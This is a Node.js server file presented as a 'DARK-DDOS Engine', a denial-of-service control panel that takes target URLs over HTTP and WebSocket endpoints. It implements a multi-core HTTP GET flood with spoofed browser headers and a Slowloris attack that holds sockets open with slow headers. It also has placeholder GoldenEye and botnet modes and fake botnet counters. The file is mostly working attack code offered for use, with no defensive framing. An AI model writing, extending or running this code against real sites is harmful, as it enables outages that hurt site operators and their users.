// server.js - Backend DDoS Engine
const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const net = require('net');
const cluster = require('cluster');
const os = require('os');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Attack state
let attacks = new Map();
let statistics = {
    totalRequests: 0,
    activeAttacks: 0,
    botnetNodes: 0,
    bandwidthUsed: 0
};

// WebSocket for real-time updates
wss.on('connection', (ws) => {
    console.log('New client connected');
    
    ws.on('message', (message) => {
        const data = JSON.parse(message);
        
        switch (data.type) {
            case 'start_attack':
                startAttack(data.target, data.method, data.threads, data.duration);
                break;
            case 'stop_attack':
                stopAttack(data.attackId);
                break;
            case 'add_botnet':
                addBotnetNode();
                break;
        }
    });
    
    // Send initial stats
    ws.send(JSON.stringify({ type: 'stats', data: statistics }));
});

// HTTP routes
app.get('/api/stats', (req, res) => {
    res.json(statistics);
});

app.post('/api/attack/start', (req, res) => {
    const { target, method, threads, duration } = req.body;
    const attackId = startAttack(target, method, threads, duration);
    res.json({ attackId });
});

app.post('/api/attack/stop/:id', (req, res) => {
    stopAttack(req.params.id);
    res.json({ success: true });
});

// Attack methods
function startAttack(target, method, threads, duration) {
    const attackId = generateId();
    
    const attack = {
        id: attackId,
        target,
        method,
        threads,
        startTime: Date.now(),
        endTime: Date.now() + (duration * 1000),
        workers: [],
        requestCount: 0
    };
    
    attacks.set(attackId, attack);
    statistics.activeAttacks++;
    
    console.log(`Starting attack ${attackId} on ${target} with ${threads} threads`);
    
    // Start attack based on method
    switch (method) {
        case 'http-flood':
            startHttpFlood(attack);
            break;
        case 'slowloris':
            startSlowloris(attack);
            break;
        case 'goldeneye':
            startGoldenEye(attack);
            break;
        case 'botnet':
            startBotnetAttack(attack);
            break;
    }
    
    return attackId;
}

function startHttpFlood(attack) {
    // Use cluster to utilize all CPU cores
    if (cluster.isMaster) {
        const numCPUs = os.cpus().length;
        
        for (let i = 0; i < Math.min(numCPUs, attack.threads); i++) {
            cluster.fork();
        }
        
        cluster.on('exit', (worker, code, signal) => {
            console.log(`Worker ${worker.process.pid} died`);
        });
    } else {
        // Worker process - actual attack
        const http = require('http');
        const https = require('https');
        
        const targetUrl = new URL(attack.target);
        const isHttps = targetUrl.protocol === 'https:';
        const client = isHttps ? https : http;
        
        const options = {
            hostname: targetUrl.hostname,
            port: targetUrl.port || (isHttps ? 443 : 80),
            path: targetUrl.pathname + targetUrl.search,
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache'
            }
        };
        
        // Flood loop
        function flood() {
            if (Date.now() > attack.endTime) {
                process.exit(0);
                return;
            }
            
            const req = client.request(options, (res) => {
                res.on('data', () => {});
                res.on('end', () => {
                    attack.requestCount++;
                    statistics.totalRequests++;
                    
                    // Continue flooding
                    setImmediate(flood);
                });
            });
            
            req.on('error', () => {
                attack.requestCount++;
                statistics.totalRequests++;
                setImmediate(flood);
            });
            
            req.end();
        }
        
        // Start multiple concurrent requests
        for (let i = 0; i < 100; i++) {
            flood();
        }
    }
}

function startSlowloris(attack) {
    // Slowloris implementation
    const net = require('net');
    const targetUrl = new URL(attack.target);
    
    for (let i = 0; i < attack.threads; i++) {
        const socket = net.createConnection({
            host: targetUrl.hostname,
            port: targetUrl.port || 80
        });
        
        attack.workers.push(socket);
        
        socket.on('connect', () => {
            // Send partial HTTP request
            socket.write(`GET ${targetUrl.pathname} HTTP/1.1\r\n`);
            socket.write(`Host: ${targetUrl.hostname}\r\n`);
            socket.write('User-Agent: Mozilla/5.0\r\n');
            
            // Keep sending headers slowly
            const interval = setInterval(() => {
                if (Date.now() > attack.endTime) {
                    clearInterval(interval);
                    socket.end();
                    return;
                }
                
                socket.write(`X-a: ${Math.random()}\r\n`);
            }, 15000);
            
            attack.intervals.push(interval);
        });
    }
}

function startGoldenEye(attack) {
    // GoldenEye implementation
    // Similar to HTTP flood but with keep-alive connections
    console.log('GoldenEye attack started');
}

function startBotnetAttack(attack) {
    // Simulate botnet attack
    console.log('Botnet attack started');
    // This would connect to actual botnet nodes
}

function stopAttack(attackId) {
    const attack = attacks.get(attackId);
    if (!attack) return;
    
    // Stop all workers
    attack.workers.forEach(worker => {
        if (worker.terminate) worker.terminate();
        if (worker.end) worker.end();
        if (worker.destroy) worker.destroy();
    });
    
    // Clear intervals
    attack.intervals?.forEach(interval => clearInterval(interval));
    
    attacks.delete(attackId);
    statistics.activeAttacks--;
    
    console.log(`Stopped attack ${attackId}`);
}

function addBotnetNode() {
    // Simulate adding botnet node
    statistics.botnetNodes++;
    console.log('Botnet node added');
}

function generateId() {
    return Math.random().toString(36).substr(2, 9);
}

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`⚡ DARK-DDOS Engine running on port ${PORT}`);
    console.log(`📊 Available CPUs: ${os.cpus().length}`);
    console.log(`💾 Total memory: ${(os.totalmem() / 1024 / 1024 / 1024).toFixed(2)} GB`);
});

// Update statistics every second
setInterval(() => {
    statistics.bandwidthUsed = statistics.totalRequests * 0.001;
    
    // Broadcast to all WebSocket clients
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify({ type: 'stats', data: statistics }));
        }
    });
}, 1000);
